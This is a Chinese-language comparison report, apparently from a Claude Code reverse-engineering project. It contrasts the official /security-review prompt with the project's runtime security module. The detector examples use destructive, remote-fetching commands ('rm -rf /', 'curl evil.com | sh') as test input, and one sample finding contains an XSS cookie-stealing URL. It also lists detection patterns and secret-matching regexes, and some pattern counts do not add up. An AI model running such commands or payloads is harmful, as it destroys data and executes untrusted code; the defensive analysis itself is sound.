# Security 相关提示词对比分析

## 概述

本文档对比了项目中 Security 模块的实现与官方 Claude Code CLI 中的安全审查提示词。

**对比日期**: 2025-12-30
**项目路径**: `/home/user/claude-code-open/src/security/`
**官方源码**: `/home/user/claude-code-open/node_modules/@anthropic-ai/claude-code/cli.js`

---

## 1. 官方实现：安全审查提示词

### 1.1 位置和用途

官方实现包含一个完整的**安全代码审查提示词**，用于审查 Git 分支上的代码变更。

**文件位置**: `cli.js` (内嵌的 `/security-review` 命令)

### 1.2 核心功能

官方的安全审查提示词是一个**AI驱动的安全代码审查工具**，具有以下特点：

#### 审查范围
- 针对 PR/分支的代码变更进行安全审查
- 自动获取 git diff、git status、git log
- 使用 Task 子任务进行多阶段分析

#### 安全类别（覆盖面）

1. **Input Validation Vulnerabilities（输入验证漏洞）**
   - SQL injection
   - Command injection
   - XXE injection
   - Template injection
   - NoSQL injection
   - Path traversal

2. **Authentication & Authorization Issues（认证授权问题）**
   - Authentication bypass
   - Privilege escalation
   - Session management flaws
   - JWT token vulnerabilities
   - Authorization logic bypasses

3. **Crypto & Secrets Management（加密和密钥管理）**
   - Hardcoded API keys, passwords, tokens
   - Weak cryptographic algorithms
   - Improper key storage
   - Cryptographic randomness issues
   - Certificate validation bypasses

4. **Injection & Code Execution（注入和代码执行）**
   - Remote code execution via deserialization
   - Pickle injection (Python)
   - YAML deserialization vulnerabilities
   - Eval injection
   - XSS vulnerabilities (reflected, stored, DOM-based)

5. **Data Exposure（数据泄露）**
   - Sensitive data logging or storage
   - PII handling violations
   - API endpoint data leakage
   - Debug information exposure

#### 分析方法论

官方提示词采用**三阶段分析法**：

```
Phase 1 - Repository Context Research
  - 识别现有安全框架和库
  - 查找已建立的安全编码模式
  - 检查现有的清洗和验证模式
  - 理解项目的安全模型和威胁模型

Phase 2 - Comparative Analysis
  - 对比新代码与现有安全模式
  - 识别与已建立安全实践的偏差
  - 查找不一致的安全实现
  - 标记引入新攻击面的代码

Phase 3 - Vulnerability Assessment
  - 检查每个修改文件的安全影响
  - 追踪从用户输入到敏感操作的数据流
  - 查找不安全跨越权限边界的地方
  - 识别注入点和不安全的反序列化
```

#### 误报过滤机制

官方实现包含**17条硬排除规则**和**12条先例规则**：

**HARD EXCLUSIONS（硬排除）**:
1. DOS 漏洞或资源耗尽攻击
2. 已安全存储在磁盘上的秘密
3. 速率限制问题
4. 内存/CPU消耗问题
5. 非安全关键字段缺少输入验证
6. GitHub Action 工作流的输入清洗问题（除非明确可通过不受信任的输入触发）
7. 缺乏加固措施
8. 理论性竞态条件或时序攻击
9. 过时第三方库的漏洞
10. Rust 等内存安全语言的内存安全问题
11. 仅用于单元测试的文件
12. 日志欺骗问题（输出未清洗的用户输入到日志不是漏洞）
13. 仅控制路径的 SSRF 漏洞
14. 在 AI 系统提示词中包含用户控制的内容不是漏洞
15. Regex 注入不是漏洞
16. Regex DOS 问题
17. 不安全的文档（Markdown 文件中的发现）

**PRECEDENTS（先例规则）**:
1. 以明文记录高价值秘密是漏洞，但记录 URL 是安全的
2. UUID 可以假设是不可猜测的
3. 环境变量和 CLI 标志是可信值
4. 资源管理问题（如内存/文件描述符泄漏）无效
5. 微妙或低影响的 Web 漏洞（如 tabnabbing、XS-Leaks 等）
6. React 和 Angular 通常可防御 XSS（除非使用 dangerouslySetInnerHTML 等）
7. GitHub Action 工作流中的大多数漏洞实际上无法利用
8. 客户端 JS/TS 代码中缺少权限检查或身份验证不是漏洞
9. 仅包含明显且具体的 MEDIUM 级别发现
10. Jupyter notebook 中的大多数漏洞实际上无法利用
11. 记录非 PII 数据不是漏洞
12. Shell 脚本中的命令注入通常无法利用

#### 置信度评分系统

```
信心评分 (1-10):
  - 1-3: 低信心，可能是误报
  - 4-6: 中等信心，需要调查
  - 7-10: 高信心，可能是真实漏洞

严重性级别:
  - HIGH: 直接可利用的漏洞（RCE、数据泄露、身份验证绕过）
  - MEDIUM: 需要特定条件但影响重大的漏洞
  - LOW: 深度防御问题或低影响漏洞
```

#### 输出格式

```markdown
# Vuln 1: XSS: `foo.py:42`

* Severity: High
* Description: User input from `username` parameter is directly interpolated into HTML without escaping
* Exploit Scenario: Attacker crafts URL like /bar?q=<script>alert(document.cookie)</script>
* Recommendation: Use Flask's escape() function or Jinja2 templates with auto-escaping
```

---

## 2. 项目实现：Security 模块

### 2.1 模块结构

项目实现了一个完整的**运行时安全框架**，包含以下模块：

```
/home/user/claude-code-open/src/security/
├── command-injection.ts     # 命令注入检测和防护
├── validate.ts              # 配置验证和风险评估（1150行）
├── sensitive.ts             # 敏感数据检测和屏蔽
├── audit.ts                 # 审计日志系统（1258行）
├── runtime-monitor.ts       # 运行时监控
├── sensitive-enhanced.ts    # 增强敏感数据检测
├── index.ts                 # 模块导出
├── example.ts               # 使用示例
└── README.md                # 文档
```

### 2.2 核心功能对比

| 功能类别 | 官方实现 | 项目实现 | 差异分析 |
|---------|---------|---------|---------|
| **用途** | AI 驱动的代码审查 | 运行时安全防护 | 完全不同的应用场景 |
| **触发时机** | 手动执行 `/security-review` | 运行时自动检测 | 官方是人工触发，项目是自动化 |
| **检测方法** | LLM 分析代码 diff | 正则模式匹配 + 规则引擎 | 官方依赖 AI，项目用确定性算法 |
| **命令注入** | 通过 LLM 识别 | 15种危险模式 + Shell元字符检测 | 项目更具体和可预测 |
| **敏感数据** | 通过 LLM 识别 | 25种模式（API密钥、密码、PII等） | 项目有明确的正则规则 |
| **配置验证** | 无 | 26种安全检查 + 风险评分 | 项目独有功能 |
| **审计日志** | 无 | 完整的审计日志系统 | 项目独有功能 |
| **误报控制** | 29条过滤规则 + 置信度评分 | 确定性匹配，较少误报 | 官方更复杂但更灵活 |

### 2.3 项目模块详细功能

#### 2.3.1 命令注入检测 (command-injection.ts)

**检测模式**（15种）:
1. Command Chaining（命令链）
2. Command Substitution - backtick（反引号命令替换）
3. Command Substitution - dollar（$() 命令替换）
4. Recursive Delete（递归删除）
5. Disk Wipe（磁盘擦除）
6. Format Command（格式化命令）
7. Download and Execute（下载并执行）
8. Remote Script Execution（远程脚本执行）
9. Sudo Command（权限提升）
10. Chmod 777（过度宽松权限）
11. Device File Redirect（设备文件重定向）
12. System File Overwrite（系统文件覆盖）
13. Base64 Decode Execute（Base64解码执行）
14. Hex Decode Execute（十六进制解码执行）
15. Path Traversal（路径遍历）

**额外检测**:
- Shell 元字符检测: `|`, `&`, `;`, `` ` ``, `$`, `(`, `)`, `<`, `>`, `\n`, `\r`
- 危险环境变量: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`
- 使用 shell-quote 库进行参数清洗

**对比官方**:
- 官方依赖 LLM 理解命令注入的上下文
- 项目使用确定性模式匹配，更快但可能遗漏复杂场景

#### 2.3.2 配置验证 (validate.ts)

**26种安全检查**，分为7个类别：

1. **Authentication（3检查）**
   - auth-01: Authentication required
   - auth-02: OAuth token expiry
   - auth-03: API key security

2. **Permissions（4检查）**
   - perm-01: Audit logging enabled
   - perm-02: Path restrictions
   - perm-03: Tool allowlist
   - perm-04: Command restrictions

3. **Network（3检查）**
   - net-01: SSL/TLS enabled
   - net-02: External request policy
   - net-03: Blocked domains

4. **Filesystem（4检查）**
   - fs-01: Working directory restriction
   - fs-02: Symlink traversal protection
   - fs-03: File size limits
   - fs-04: Dangerous file extensions

5. **Execution（4检查）**
   - exec-01: Sandbox enabled
   - exec-02: Execution timeout
   - exec-03: Resource limits
   - exec-04: Shell command restrictions

6. **Data Security（4检查）**
   - data-01: Encryption at rest
   - data-02: Encryption in transit
   - data-03: Sensitive data masking
   - data-04: Data retention policy

7. **Code Signing（2检查）**
   - sign-01: Code signing enabled
   - sign-02: Verify before execution

**风险评分系统**:
```typescript
严重性权重:
  - Critical: 10分
  - Error: 7分
  - Warning: 4分
  - Info: 1分

类别权重:
  - Auth: 1.5x
  - Execution: 1.4x
  - Data: 1.3x
  - Network: 1.2x
  - Filesystem: 1.1x
  - Permissions: 1.0x
  - General: 0.8x

风险级别:
  - 0-24: Low
  - 25-49: Medium
  - 50-74: High
  - 75-100: Critical
```

**对比官方**:
- 官方没有配置验证功能
- 项目提供了完整的安全配置管理和评估系统

#### 2.3.3 敏感数据检测 (sensitive.ts)

**25种敏感数据模式**:

**API密钥（10种）**:
1. AWS Access Key: `AKIA[0-9A-Z]{16}`
2. AWS Secret Key
3. GitHub Token: `gh[pousr]_[A-Za-z0-9_]{36,}`
4. Anthropic API Key: `sk-ant-api03-[A-Za-z0-9_-]{95}`
5. OpenAI API Key
6. Slack Token
7. Stripe API Key
8. Google API Key
9. Google OAuth
10. Heroku API Key

**密钥和令牌（3种）**:
11. JWT Token
12. SSH Private Key
13. PGP Private Key

**数据库（2种）**:
14. Database URL with credentials
15. JDBC Connection String

**通用密钥（4种）**:
16. Password in Code
17. API Key Generic
18. Secret Key Generic
19. Token Generic

**个人信息（3种）**:
20. Email Address
21. Credit Card
22. US Social Security Number

**其他（3种）**:
23. Private IP Address
24. SSL Certificate

**功能特性**:
- 扫描文件和目录
- 敏感值屏蔽（保留前后4个字符）
- 位置信息（行号、列号）
- 上下文提取（前后50字符）

**对比官方**:
- 官方通过 LLM 识别硬编码的密钥
- 项目使用正则表达式，可以快速扫描大量文件

#### 2.3.4 审计日志系统 (audit.ts)

**功能完整的审计日志系统**（1258行）:

**9种事件类型**:
1. tool_use - 工具使用
2. permission - 权限检查
3. file_access - 文件访问
4. network - 网络请求
5. auth - 身份验证
6. config - 配置变更
7. session - 会话操作
8. error - 错误事件
9. security - 安全事件

**核心功能**:
- 事件记录（支持敏感数据清洗）
- 日志存储（JSONL格式，支持轮转和压缩）
- 日志查询（强大的过滤和搜索）
- 统计分析（按类型、执行者、结果等分组）
- 合规报告（JSON、CSV、HTML、Markdown格式）

**对比官方**:
- 官方没有审计日志功能
- 项目提供了企业级的审计日志系统

---

## 3. 关键差异总结

### 3.1 应用场景

| 维度 | 官方实现 | 项目实现 |
|-----|---------|---------|
| **主要用途** | PR/代码审查 | 运行时防护 |
| **执行时机** | 手动触发 | 自动化执行 |
| **分析对象** | Git diff（代码变更） | 运行时数据和配置 |
| **技术栈** | LLM + 提示词工程 | TypeScript + 正则 + 规则引擎 |

### 3.2 优势对比

**官方实现的优势**:
1. ✅ 理解复杂的代码上下文和逻辑
2. ✅ 识别微妙的业务逻辑漏洞
3. ✅ 自适应各种编程语言和框架
4. ✅ 精细的误报过滤（29条规则）
5. ✅ 三阶段分析方法论
6. ✅ 置信度评分系统

**官方实现的劣势**:
1. ❌ 依赖 LLM 调用（成本、延迟）
2. ❌ 结果不完全确定性
3. ❌ 仅适用于代码审查场景
4. ❌ 无运行时防护能力
5. ❌ 无配置验证功能
6. ❌ 无审计日志功能

**项目实现的优势**:
1. ✅ 运行时实时防护
2. ✅ 快速（无 LLM 调用开销）
3. ✅ 确定性结果（可重现）
4. ✅ 配置验证和风险评估
5. ✅ 完整的审计日志系统
6. ✅ 多种安全模块（命令注入、敏感数据、配置验证）

**项目实现的劣势**:
1. ❌ 仅基于模式匹配，可能遗漏复杂场景
2. ❌ 需要维护正则表达式规则
3. ❌ 无法理解业务逻辑漏洞
4. ❌ 不适用于代码审查场景
5. ❌ 可能产生更多误报（虽然确定性，但覆盖面窄）

### 3.3 互补性分析

官方实现和项目实现**高度互补**，适合组合使用：

```
┌─────────────────────────────────────────────────────────┐
│                   完整安全解决方案                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  开发阶段                运行时                        │
│  ┌──────────┐           ┌──────────┐                   │
│  │ 官方实现 │           │项目实现  │                   │
│  │          │           │          │                   │
│  │ AI驱动的 │           │确定性的  │                   │
│  │代码审查  │           │运行时防护│                   │
│  │          │           │          │                   │
│  │• PR审查  │           │• 命令注入│                   │
│  │• Diff分析│           │• 敏感数据│                   │
│  │• 上下文理解│         │• 配置验证│                   │
│  │• 业务逻辑│           │• 审计日志│                   │
│  └──────────┘           └──────────┘                   │
│       ↓                      ↓                          │
│  发现深层漏洞         实时阻止攻击                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 4. 具体实现对比示例

### 4.1 命令注入检测对比

#### 官方方法（LLM 分析）

```
输入: git diff 显示的代码变更
处理:
  1. LLM 阅读代码上下文
  2. 理解数据流（从用户输入到命令执行）
  3. 识别不安全的拼接或执行
输出:
  # Vuln: Command Injection: `app.py:42`
  * Severity: High
  * Description: User input directly passed to subprocess.run()
  * Exploit Scenario: ...
  * Recommendation: Use shlex.quote() or parameterized execution
```

#### 项目方法（模式匹配）

```typescript
// 输入: 要执行的命令字符串
const result = detector.detect("rm -rf / && echo 'pwned'");

// 处理: 匹配15种危险模式
// 输出:
{
  safe: false,
  violations: [
    {
      pattern: 'Command Chaining',
      severity: 'critical',
      description: 'Dangerous command chaining detected',
      match: '; rm'
    }
  ]
}
```

**对比**:
- 官方能理解 `user_input = request.args.get('cmd'); subprocess.run(user_input)` 这种跨行的漏洞
- 项目只能检测最终拼接的命令字符串中的模式

### 4.2 敏感数据检测对比

#### 官方方法

```
通过 LLM 分析代码中的：
- 硬编码的 API 密钥
- 密码变量赋值
- 数据库连接字符串
- 环境变量泄露
能理解上下文，例如：
  - 区分测试密钥 vs 生产密钥
  - 识别"假"密钥（示例代码）
  - 检测密钥是否通过安全渠道加载
```

#### 项目方法

```typescript
const detector = new SensitiveDataDetector();
const matches = detector.detect(fileContent);

// 匹配模式:
// - AWS Access Key: AKIA[0-9A-Z]{16}
// - Anthropic API Key: sk-ant-api03-[A-Za-z0-9_-]{95}
// - 等25种模式

// 无法区分:
// - 是否是测试环境的密钥
// - 是否是注释中的示例
// - 是否已通过环境变量加载（仅检测硬编码）
```

**对比**:
- 官方更智能，理解上下文
- 项目更快速，适合大规模扫描

---

## 5. 缺失功能分析

### 5.1 官方有但项目没有的功能

1. **AI 驱动的代码审查**
   - LLM 理解代码上下文
   - 识别业务逻辑漏洞
   - 自适应多种语言和框架

2. **三阶段分析方法论**
   - Repository Context Research
   - Comparative Analysis
   - Vulnerability Assessment

3. **精细的误报过滤**
   - 29条排除规则
   - 置信度评分（1-10）
   - 基于上下文的判断

4. **Git 集成**
   - 自动获取 git diff
   - 分析代码变更
   - PR 审查工作流

### 5.2 项目有但官方没有的功能

1. **运行时防护**
   - 实时命令注入检测
   - 运行时敏感数据屏蔽
   - 执行前验证

2. **配置安全验证**
   - 26种安全检查
   - 风险评分系统
   - 自动修复建议

3. **审计日志系统**
   - 9种事件类型
   - 完整的查询和过滤
   - 多格式报告导出

4. **确定性防护**
   - 基于规则的检测
   - 可预测的行为
   - 零 LLM 依赖

---

## 6. 改进建议

### 6.1 项目可以从官方学习的地方

1. **增强误报过滤**
   ```typescript
   // 当前: 仅基于模式匹配
   // 改进: 添加上下文规则，例如：
   const contextRules = {
     ignoreTestFiles: true,
     ignoreComments: true,
     ignoreDocumentation: true,
     ignoreExampleCode: true
   };
   ```

2. **增加置信度评分**
   ```typescript
   interface DetectionResult {
     safe: boolean;
     violations: Violation[];
     confidence: number; // 1-10
     context: {
       isTestFile: boolean;
       isCommentedOut: boolean;
       hasValidation: boolean;
     };
   }
   ```

3. **添加 Git 集成**
   ```typescript
   // 新功能: 扫描 git diff
   class SecurityScanner {
     async scanGitDiff(baseBranch: string): Promise<ScanResult> {
       const diff = await execGit('diff', baseBranch);
       return this.scanChanges(diff);
     }
   }
   ```

### 6.2 官方可以从项目学习的地方

1. **添加运行时防护**
   - 在工具执行前进行实时检测
   - 阻止明显的危险操作

2. **配置验证功能**
   - 检查 Claude Code 的安全配置
   - 生成配置改进建议

3. **审计日志**
   - 记录所有工具使用
   - 提供合规报告

---

## 7. 结论

### 7.1 核心发现

1. **官方实现**是一个**AI驱动的代码审查工具**，专注于 PR/分支审查
2. **项目实现**是一个**运行时安全防护框架**，专注于执行时保护
3. 两者**应用场景完全不同**，但可以**互补使用**

### 7.2 定位差异

```
官方定位: Static Analysis (静态分析) + AI
  └─ 审查代码变更
  └─ 发现深层逻辑漏洞
  └─ 需要 LLM 推理

项目定位: Runtime Protection (运行时防护) + Deterministic
  └─ 保护执行环境
  └─ 阻止明显攻击
  └─ 确定性规则引擎
```

### 7.3 推荐用法

**最佳实践**：组合使用官方和项目实现

```
开发流程:
  1. 代码编写
  2. 提交到 Git
  3. 创建 PR
  4. 运行 /security-review (官方)  ← AI 审查
  5. 修复发现的漏洞
  6. 合并代码
  7. 部署运行
  8. Security模块监控 (项目)      ← 运行时防护
  9. 审计日志记录
```

### 7.4 最终评价

| 评价维度 | 官方实现 | 项目实现 |
|---------|---------|---------|
| **创新性** | ⭐⭐⭐⭐⭐ AI驱动审查 | ⭐⭐⭐⭐ 综合安全框架 |
| **实用性** | ⭐⭐⭐⭐ PR审查场景 | ⭐⭐⭐⭐⭐ 生产环境防护 |
| **完整性** | ⭐⭐⭐ 单一功能 | ⭐⭐⭐⭐⭐ 多模块系统 |
| **可靠性** | ⭐⭐⭐ 依赖LLM | ⭐⭐⭐⭐⭐ 确定性规则 |
| **性能** | ⭐⭐⭐ 较慢（LLM） | ⭐⭐⭐⭐⭐ 极快（正则） |

**总体结论**:
- 官方实现在**智能性和深度分析**方面表现优异
- 项目实现在**运行时防护和系统完整性**方面更胜一筹
- 两者结合可以提供**全生命周期的安全保障**

---

## 附录：代码示例

### A.1 官方安全审查提示词完整内容

见文件：`/tmp/official_security_prompt.txt`

### A.2 项目安全模块核心代码

#### 命令注入检测示例

```typescript
import { CommandInjectionDetector } from './security/command-injection';

const detector = new CommandInjectionDetector();

// 检测危险命令
const result = detector.detect("rm -rf / && curl evil.com | sh");

if (!result.safe) {
  console.error('Dangerous command detected:');
  result.violations.forEach(v => {
    console.error(`- ${v.pattern}: ${v.description}`);
  });
}
```

#### 配置验证示例

```typescript
import { SecurityValidator, createDefaultSecureConfig } from './security/validate';

const validator = new SecurityValidator();
const config = createDefaultSecureConfig();

const report = validator.validate(config);

console.log(`Risk Score: ${report.riskScore}/100`);
console.log(`Risk Level: ${report.riskLevel}`);
console.log(`Passed: ${report.passedChecks}/${report.totalChecks}`);
```

#### 敏感数据检测示例

```typescript
import { SensitiveDataDetector } from './security/sensitive';

const detector = new SensitiveDataDetector();

// 扫描目录
const result = await detector.scan('./src', {
  exclude: ['**/node_modules/**', '**/dist/**']
});

console.log(`Found ${result.totalMatches} sensitive data in ${result.files.length} files`);
console.log(`Critical: ${result.summary.critical}`);
console.log(`High: ${result.summary.high}`);
```

#### 审计日志示例

```typescript
import { AuditLogger } from './security/audit';

const logger = new AuditLogger({
  enabled: true,
  logDir: '~/.claude/security'
});

// 记录工具使用
logger.logToolUse('Bash', { command: 'ls -la' }, 'success');

// 记录权限检查
logger.logPermissionCheck('Write', true, 'User has write permission');

// 查询日志
const events = await logger.query({
  types: ['security'],
  severities: ['critical', 'high'],
  startTime: new Date('2025-01-01')
});

// 生成报告
const report = await logger.exportReport({
  format: 'html',
  includeStatistics: true,
  outputPath: './security-report.html'
});
```

---

**文档版本**: 1.0
**生成日期**: 2025-12-30
**维护者**: Claude Code 反向工程项目
